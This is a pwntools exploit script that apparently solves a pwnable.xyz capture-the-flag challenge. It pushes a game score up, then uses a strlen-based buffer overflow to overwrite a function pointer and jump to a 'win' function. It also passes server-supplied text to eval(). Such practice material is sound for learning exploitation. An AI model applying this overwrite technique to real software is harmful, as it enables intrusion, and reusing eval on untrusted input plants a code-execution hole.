from pwn import *

###Structure
'''
game
    |   4   |   4   |   4   |   4   |
0x00|              name             |
0x10| score |(score)|    funcptr    |
'''

###Util
def play(mode='play'):
    r.sendlineafter('> ','1')
    if mode=='play':
        prob = r.recvuntil('= ',drop=True)
        ans = int(eval(prob))%0x100000000
        print(prob,ans)
        r.sendline(str(ans-1))

def save():
    r.sendlineafter('> ','2')

def edit(data):
    r.sendlineafter('> ','3')
    r.send(data)


###Addr
win = 0x4009d6

###Exploit
r = remote('svc.pwnable.xyz',30009)
r.sendafter('Name: ','a'*0x10)

###Get 0xffff as score
play()

###Type conversion extends int16 score to int64
save()

###strlen buffer overflow
edit(b'a'*0x18+p64(win).strip(b'\x00'))
play(mode='flag')
r.interactive()

